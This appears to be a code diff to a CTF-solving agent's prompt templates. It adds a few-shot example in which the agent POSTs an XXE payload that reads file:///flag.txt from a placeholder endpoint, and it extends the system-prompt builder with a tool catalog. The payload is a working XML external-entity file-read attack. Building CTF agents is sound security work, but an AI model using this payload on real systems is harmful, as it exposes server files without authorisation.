@@ -9,7 +9,7 @@ All templates support placeholder substitution for:
 - {challenge_hints}: Hints for the challenge
 """
 
-from typing import Dict, Optional
+from typing import Any, Dict, Iterable, List, Optional, Tuple
 
 from fairlib import Example
 
@@ -472,10 +472,35 @@ Body:
 )
 
 
+# Few-shot example: XXE payload via http_fetch with properly-escaped raw_body
+# Shows the LLM exactly how to escape inner quotes in an XML payload — the
+# failure mode Phase 3b targets (v3.3 Phase 3b). Every inner double quote
+# inside the ``raw_body`` string literal must be written as ``\"``.
+XXE_RAW_BODY_EXAMPLE = Example(
+    """User Request: Server accepts application/xml POSTs at http://example.com/api/search. Check if it is vulnerable to XXE and read /flag.txt if so.
+
+{"thought": "The endpoint accepts XML, so XXE is a plausible vector. I will POST an XML payload that declares an external entity referencing /flag.txt. CRITICAL: inside the JSON raw_body string, every inner double quote must be escaped as \\\". Writing <?xml version=\\"1.0\\"?> inside a JSON string keeps the JSON valid.", "action": {"tool_name": "http_fetch", "tool_input": {"url": "http://example.com/api/search", "method": "POST", "headers": {"Content-Type": "application/xml"}, "raw_body": "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///flag.txt\\">]><root>&xxe;</root>"}}}
+
+Tool Observation: [HttpFetchTool] Method: POST
+URL: http://example.com/api/search
+Status: 200
+Body:
+<result>FLAG{xxe_ext3rnal_entity_win}</result>
+
+{"thought": "The XXE payload worked and the server reflected the contents of /flag.txt inside the response. The flag matches the expected format.", "action": {"tool_name": "final_answer", "tool_input": "The flag is FLAG{xxe_ext3rnal_entity_win}, extracted via an XXE external-entity attack against the /api/search XML endpoint."}}
+"""
+)
+
+
 def get_system_prompt(
     platform_name: str = "Generic CTF",
     flag_regex: str = r"(?:[A-Za-z0-9_]+)?\{[^\n\r{}]{1,200}\}",
     custom_prompt: Optional[str] = None,
+    tool_descriptors: Optional[
+        Iterable[
+            Tuple[str, str, Optional[Dict[str, Any]], Optional[List[Dict[str, Any]]]]
+        ]
+    ] = None,
 ) -> str:
     """
     Generate a system prompt with placeholders filled in.
@@ -484,14 +509,39 @@ def get_system_prompt(
         platform_name: Name of the CTF platform
         flag_regex: Regular expression for flag detection
         custom_prompt: Custom prompt template (uses default if None)
+        tool_descriptors: Optional iterable of (name, description, schema, samples)
+            tuples — typically produced by ``ctf_solver.tools.schema.collect_tool_descriptors``.
+            When provided, an auto-rendered ``## Tool catalog`` section is appended
+            so the model sees per-tool typed args + sample inputs alongside the
+            prose tool listing already in the prompt.  When None, only the
+            template's prose listing is used (legacy behaviour).
 
     Returns:
         Formatted system prompt string
     """
     template = custom_prompt or DEFAULT_SYSTEM_PROMPT
-    return template.format(
+    base = template.format(
         platform_name=platform_name,
         flag_regex=flag_regex,
+    )
+
+    if not tool_descriptors:
+        return base
+
+    # Local import so importing the templates module does not pull in the
+    # whole tools package (the ctf_solver.tools.schema module is light, but
+    # tools/__init__.py is heavy).
+    from ctf_solver.tools.schema import render_tools_section
+
+    catalog = render_tools_section(tool_descriptors)
+    if not catalog:
+        return base
+    return (
+        base
+        + "\n\n## Tool catalog (auto-generated from schemas)\n"
+        + "Use this catalog as the authoritative argument reference. The prose "
+        "tool listing above is for context; this catalog is the source of "
+        "truth for required keys, types, and sample inputs.\n\n" + catalog
     )
 
 
